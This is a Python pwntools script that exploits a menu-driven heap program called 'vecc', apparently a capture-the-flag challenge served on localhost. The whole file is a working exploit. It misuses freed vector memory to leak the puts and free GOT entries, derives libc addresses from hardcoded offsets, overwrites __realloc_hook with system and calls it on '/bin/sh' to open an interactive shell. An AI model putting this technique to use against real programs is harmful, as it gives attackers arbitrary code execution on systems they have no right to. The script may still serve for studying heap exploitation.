from pwn import *

def exit_proc():
	p.recvuntil("> ")
	p.sendline("0")

def create_vecc(index):
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()

def destroy_vecc(index):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()

def append_vecc(index, buffer, readline=True):
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()
	p.sendline("{}".format(len(buffer)))
	p.send(buffer)
	if readline:
		p.recvline()

def clear_vecc(index):
	p.recvuntil("> ")
	p.sendline("4")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()

def show_vecc(index, bytes):
	p.recvuntil("> ")
	p.sendline("5")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	return p.recv(bytes)

p = remote("localhost", 1337)
# p = process("../publish/vecc")

create_vecc(0)
append_vecc(0, b"A" * 0x10)
destroy_vecc(0)
create_vecc(1)
create_vecc(2)
create_vecc(3)

puts_got = 0x601fa0
clear_vecc(2)
append_vecc(2, p64(puts_got) + p32(8) + b"AAAA")
puts_libc = u64(show_vecc(3, 8))

print("Puts address: {}".format(hex(puts_libc)))

free_got = 0x601f90
clear_vecc(2)
append_vecc(2, p64(free_got) + p32(8) + b"AAAA")
free_libc = u64(show_vecc(3, 8))

print("Free address: {}".format(hex(free_libc)))

libc_base = puts_libc - 0x809c0
system = libc_base + 0x4f440
realloc_hook = libc_base + 0x3ebc28
str_bin_sh = libc_base + 0x1b3e9a

print("Realloc hook address: {}".format(hex(realloc_hook)))

clear_vecc(2)
append_vecc(2, p64(realloc_hook) + p32(0) + b"AAAA")
append_vecc(3, p64(system))

clear_vecc(2)
append_vecc(2, p64(str_bin_sh) + p32(8) + p32(8))
append_vecc(3, "A", readline=False)

p.interactive()
